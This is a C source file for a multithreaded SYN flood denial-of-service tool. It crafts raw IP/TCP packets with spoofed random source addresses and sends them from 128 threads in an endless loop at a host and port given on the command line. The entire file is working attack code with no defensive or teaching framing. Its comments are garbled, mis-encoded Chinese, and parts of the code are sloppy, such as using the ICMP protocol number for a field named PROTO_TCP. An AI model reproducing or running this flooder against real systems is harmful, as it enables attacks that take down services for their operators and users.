#include <stdio.h>
#include <ctype.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <errno.h>
#include <stdlib.h>
#include <time.h> 

#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <string.h>
#include <pthread.h>


/* ����߳��� */
#define MAXCHILD 128
/* Ŀ��IP��ַ */
static unsigned long dest = 0;
static unsigned short dest_port = 0;
/* ICMPЭ���ֵ */
static int PROTO_TCP = -1;
/* ������־ */
static int alive = -1;

static int rawsock = 0;				/*���ͺͽ����߳���Ҫ��socket������*/

typedef unsigned short u16;

/* ���������������
*  ����ϵͳ�ĺ���Ϊα�������
*	�����ʼ���йأ����ÿ���ò�ֵͬ���г�ʼ��
*/
static inline long 
	myrandom (int begin, int end)
{
	int gap = end - begin +1;
	int ret = 0;

	/* ��ϵͳʱ���ʼ�� */
	srand((unsigned)time(0));
	/* ����һ������begin��end֮���ֵ */
	//ret = random(end)%gap + begin;
	ret = random()%gap + begin;
	return ret;
}

/* CRC16У�� */
static unsigned short
	DoS_cksum (unsigned short *data, int length)     
{  
	register int left = length;  
	register unsigned short *word = data;  
	register int sum = 0;  
	unsigned short ret = 0;  

	/* ����ż���ֽ� */
	while (left > 1)    
	{      
		sum += *word++;      
		left -= 2;    
	}  

	/* ���Ϊ����,�����һ���ֽڵ�������
	*	ʣ���һ���ֽ�Ϊ���ֽڹ���һ��short���ͱ���ֵ
	*/
	if (left == 1)    
	{      
		*(unsigned char *) (&ret) = *(unsigned char *) word;      
		sum += ret;    
	}  

	/* �۵� */
	sum = (sum >> 16) + (sum & 0xffff);  
	sum += (sum >> 16);  

	/* ȡ�� */
	ret = ~sum;  
	return (ret);
}


static void
	DoS_syn (void)
{ 
	
	/* ����Ŀ�ĵ�ַ */
	struct sockaddr_in to;  
	
	/* DOS�ṹ,��ΪIPͷ����TCPͷ����TCP���ݲ��� */
	struct   dosseg_t 
	{      
		struct ip iph;      
		struct tcphdr tcph;      
		unsigned char data[8192];    
	}  dosseg;

	char * buffer = (char *)&dosseg;

	/* IP�İ汾,IPv4 */
	dosseg.iph.ip_v = 4;  
	/* IPͷ������,�ֽ��� */
	dosseg.iph.ip_hl = 5;  
	/* �������� */
	dosseg.iph.ip_tos = 0;  
	/* IP���ĵ��ܳ��� */
	dosseg.iph.ip_len = htons (sizeof(struct ip)+sizeof(struct tcphdr));  
	/* ��ʶ,����ΪPID */
	dosseg.iph.ip_id = htons (getpid ());  
	/* �εı��˵�ַ */
	dosseg.iph.ip_off = 0; 
	/* TTL */
	dosseg.iph.ip_ttl = myrandom (128, 255);  ;  
	/* Э������ */
	dosseg.iph.ip_p = PROTO_TCP;  
	/* У���,����дΪ0 */
	dosseg.iph.ip_sum = 0;  
	/* ���͵�Դ��ַ */
	dosseg.iph.ip_src.s_addr = (unsigned long) myrandom(0, 65535);       
	/* ����Ŀ���ַ */
	dosseg.iph.ip_dst.s_addr = dest;    

	dosseg.tcph.seq = htonl ((unsigned long) myrandom(0, 65535)); 
	dosseg.tcph.ack_seq = htons (myrandom(0, 65535));  
	dosseg.tcph.syn = 1;
	dosseg.tcph.urg = 1;
	dosseg.tcph.window = htons (myrandom(0, 65535));  
	dosseg.tcph.check = 0;  
	dosseg.tcph.urg_ptr = htons (myrandom(0, 65535));  
	dosseg.tcph.check = DoS_cksum ((u16 *) buffer, 
			(sizeof (struct ip) + sizeof (struct tcphdr) + 1) & ~1);  
	dosseg.iph.ip_sum = DoS_cksum ((u16 *) buffer, 
			(4 * dosseg.iph.ip_hl + sizeof (struct tcphdr) + 1) & ~1);  


	/* ��д����Ŀ�ĵ�ַ���� */
	to.sin_family =  AF_INET;  
	to.sin_addr.s_addr = dest;
	to.sin_port = htons(0);

	/* �������� */
	sendto (rawsock, 
			&dosseg, 
			4 * dosseg.iph.ip_hl + sizeof (struct tcphdr) , 
			0, 
			(struct sockaddr *) &to, 
			sizeof (struct sockaddr));  	
}

static void*
DoS_fun (void *argv)
{  
	while(alive)
	{
		DoS_syn();
	}

	return (void *)0;
}

/* �źŴ�����,�����˳�����alive */
static void 
DoS_sig(int signo)
{
	alive = 0;
	printf("stop signal!\n");
}

#define ROUND_UP(size, align) (((size) + ((align) - 1)) & ~((align) - 1))

int main(int argc, char *argv[])
{

	struct hostent * host = NULL;
	struct protoent *protocol = NULL;
	char protoname[]= "icmp";

	int i = 0;
	pthread_t pthread[MAXCHILD];
	int err = -1;

       int num = 32, align = 9;
       printf("ROUND_UP(%d, %d) = %d\n", num, align, ROUND_UP(num, align));
	
	alive = 1;
	/* ��ȡ�ź�CTRL+C */
	signal(SIGINT, DoS_sig);
	signal(SIGTSTP, DoS_sig);
	signal(SIGTERM, DoS_sig);


	/* �����Ƿ�������ȷ */
	if(argc < 3)
	{
		return -1;
	}

	/* ��ȡЭ������ICMP */
	protocol = getprotobyname(protoname);
	if (protocol == NULL)
	{
		perror("getprotobyname()");
		return -1;
	}
	PROTO_TCP = protocol->p_proto;

	/* �����Ŀ�ĵ�ַΪ�ַ���IP��ַ */
	dest = inet_addr(argv[1]);
	if(dest == INADDR_NONE)
	{
		/* ΪDNS��ַ */
		host = gethostbyname(argv[1]);
		if(host == NULL)
		{
			perror("gethostbyname");
			return -1;
		}

		/* ����ַ������dest�� */
		memcpy((char *)&dest, host->h_addr, host->h_length);
	}
	/* Ŀ�Ķ˿� */
	dest_port = atoi(argv[2]);

	/* ����ԭʼsocket */
	//rawsock = socket (AF_INET, SOCK_RAW, RAW);
	rawsock = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (rawsock < 0)	   
		rawsock = socket (AF_INET, SOCK_RAW, PROTO_TCP);	

	/* ����IPѡ�� */
	setsockopt (rawsock, SOL_IP, IP_HDRINCL, "1", sizeof ("1"));

	/* ��������߳�Эͬ���� */
	for(i=0; i<MAXCHILD; i++)
	{
		err = pthread_create(&pthread[i], NULL, DoS_fun, NULL);
	}

	/* �ȴ��߳̽��� */
	for(i=0; i<MAXCHILD; i++)
	{
		pthread_join(pthread[i], NULL);
	}

	close(rawsock);
	
	return 0;
}




